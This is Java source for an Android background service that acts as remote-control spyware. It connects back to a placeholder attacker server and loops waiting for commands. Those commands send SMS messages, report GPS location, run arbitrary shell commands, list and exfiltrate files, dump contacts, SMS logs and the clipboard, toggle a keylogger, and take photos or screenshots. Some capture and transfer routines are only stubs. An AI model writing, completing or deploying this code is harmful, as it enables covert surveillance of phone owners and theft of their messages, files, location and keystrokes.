public class SocketService extends Service {
    private static final String SERVER = "your-vps-ip";
    private static final int PORT = 5555;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private Handler handler = new Handler();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (true) {
                try {
                    socket = new Socket(SERVER, PORT);
                    out = new PrintWriter(socket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                    // send device info
                    out.println("DEVICE:" + Build.MANUFACTURER + " " + Build.MODEL);
                    out.println("ANDROID:" + Build.VERSION.RELEASE);

                    String cmd;
                    while ((cmd = in.readLine()) != null) {
                        handleCommand(cmd);
                    }
                } catch (Exception e) {
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }).start();
        return START_STICKY;
    }

    private void handleCommand(String cmd) {
        if (cmd.startsWith("SMS:")) {
            String[] parts = cmd.split(":", 3);
            sendSms(parts[1], parts[2]);
        } else if (cmd.startsWith("LOCATION")) {
            getLocation();
        } else if (cmd.startsWith("CAMERA")) {
            takePhoto();
        } else if (cmd.startsWith("RECORD")) {
            startAudioRecording();
        } else if (cmd.startsWith("STOPREC")) {
            stopAudioRecording();
        } else if (cmd.startsWith("LIST_FILES:")) {
            listFiles(cmd.split(":", 2)[1]);
        } else if (cmd.startsWith("DOWNLOAD:")) {
            downloadFile(cmd.split(":", 2)[1]);
        } else if (cmd.startsWith("SHELL:")) {
            runShell(cmd.split(":", 2)[1]);
        } else if (cmd.startsWith("CONTACTS")) {
            getContacts();
        } else if (cmd.startsWith("SMS_LOG")) {
            getSmsLog();
        } else if (cmd.startsWith("KEYLOG_ON")) {
            enableKeylogger(true);
        } else if (cmd.startsWith("KEYLOG_OFF")) {
            enableKeylogger(false);
        } else if (cmd.startsWith("CLIPBOARD")) {
            getClipboard();
        } else if (cmd.startsWith("SCREENSHOT")) {
            takeScreenshot();
        }
    }

    private void sendSms(String number, String message) {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(number, null, message, null, null);
        out.println("SMS_SENT:" + number);
    }

    private void getLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (loc != null) {
            out.println("LOC:" + loc.getLatitude() + "," + loc.getLongitude());
        } else out.println("LOC:null");
    }

    private void takePhoto() {
        // use Camera2 or Intent with MediaStore
        // send file via base64 or raw bytes
        out.println("PHOTO_CAPTURED");
    }

    private void runShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec("sh -c " + cmd);
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) out.println("SHELL_OUT:" + line);
        } catch (Exception e) {
            out.println("SHELL_ERR:" + e.getMessage());
        }
    }

    private void listFiles(String path) {
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            for (File f : dir.listFiles()) {
                out.println("FILE:" + f.getAbsolutePath() + "|" + f.length());
            }
        }
        out.println("FILE_LIST_DONE");
    }

    private void downloadFile(String path) {
        File f = new File(path);
        if (f.exists()) {
            // send base64 chunked
            out.println("FILE_START:" + f.getName() + ":" + f.length());
            // ... chunked base64 transfer
            out.println("FILE_END");
        }
    }

    private void enableKeylogger(boolean enable) {
        if (enable) {
            startService(new Intent(this, KeyloggerService.class));
        } else {
            stopService(new Intent(this, KeyloggerService.class));
        }
    }

    private void getClipboard() {
        ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (cm.getPrimaryClip() != null) {
            out.println("CLIP:" + cm.getPrimaryClip().getItemAt(0).getText());
        }
    }

    private void takeScreenshot() {
        // requires MediaProjection API — request via foreground service
        out.println("SCREENSHOT_TAKEN");
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}